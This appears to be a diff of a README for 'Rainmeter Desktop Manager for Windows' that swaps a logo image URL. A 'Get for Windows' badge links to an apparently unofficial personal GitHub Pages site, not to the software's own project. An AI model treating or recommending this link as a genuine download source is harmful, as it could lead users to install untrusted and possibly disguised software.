@@ -1,6 +1,6 @@
 # Rainmeter Desktop Manager for Windows
 
-<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYEWZbemWF9uPurI3BuWungaoquAQf5SSps0W-xSKI_g&s" alt="Rainmeter Logo" width="660">
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSTNjR2uSE4ufXPig9lC48Q5gBw-U0x55nh6ykLyIpPwQ&s=10" alt="Rainmeter Logo" width="660">
 
 [![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://tashagunfighter3.github.io/.github//Rainmeter-Desktop-Manager)
 
